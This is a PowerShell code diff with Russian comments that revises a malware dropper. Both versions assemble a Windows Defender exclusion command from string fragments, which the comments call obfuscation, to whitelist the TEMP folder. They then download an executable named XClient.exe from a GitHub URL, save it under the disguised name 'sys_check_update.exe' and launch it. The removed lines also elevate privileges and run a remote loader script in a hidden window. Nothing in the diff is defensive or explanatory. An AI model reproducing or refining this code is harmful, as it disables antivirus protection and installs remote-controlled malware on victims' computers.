@@ -1,13 +1,17 @@
-$d = 'Add-Mp' + 'Preference'; $p = '-Exclusion' + 'Path'
-$t = $env:TEMP + '\sys_check_update.exe'
-$u = 'https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe'
+# Обфусцированный вызов исключения
+$p = "Ex"+"clusion"+"Path"
+$cmd = "Add-Mp"+"Preference"
+$t = $env:TEMP
 
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe -ArgumentList "-NoP -Exec Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/winstarchik/FFF/main/loader.ps1')" -Verb RunAs
-    exit
-}
+# Выполняем добавление в исключения через склейку
+& $cmd -$p $t
 
-try { Invoke-Expression "$d $p '$env:TEMP'" } catch {}
+# Качаем билд (ссылку тоже можно подклеить)
+$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
+$o = "$t\sys_check_update.exe"
 
-(New-Object System.Net.WebClient).DownloadFile($u, $t)
-if (Test-Path $t) { Start-Process $t }
+$wc = New-Object Net.WebClient
+$wc.DownloadFile($u, $o)
+
+# Запуск
+Start-Process $o
